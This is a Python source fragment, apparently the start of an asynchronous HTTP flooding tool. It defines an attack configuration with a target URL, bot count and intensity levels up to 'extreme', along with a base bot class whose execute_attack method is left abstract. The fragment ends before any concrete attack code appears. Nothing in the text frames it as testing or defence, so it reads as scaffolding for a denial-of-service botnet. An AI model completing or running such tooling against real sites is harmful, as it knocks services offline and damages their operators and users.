import asyncio
import aiohttp
import time
import random
import threading
from abc import ABC, abstractmethod
import logging
from dataclasses import dataclass
from typing import List, Dict, Any

@dataclass
class AttackConfig:
    target_url: str
    duration: int
    intensity: str  # low, medium, high, extreme
    bot_count: int
    request_pattern: str

class BaseBot(ABC):
    def __init__(self, bot_id: int, config: AttackConfig):
        self.bot_id = bot_id
        self.config = config
        self.session = None
        self.active = False
        self.stats = {
            'requests_sent': 0,
            'responses_received': 0,
            'errors': 0,
            'start_time': None
        }
    
    @abstractmethod
    async def execute_attack(self):
        pass
    
    async def setup_session(self):
        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100)
        self.session = aiohttp.ClientSession(connector=connector)
    
    async def cleanup(self):
        if self.session:
            await self.session.close()
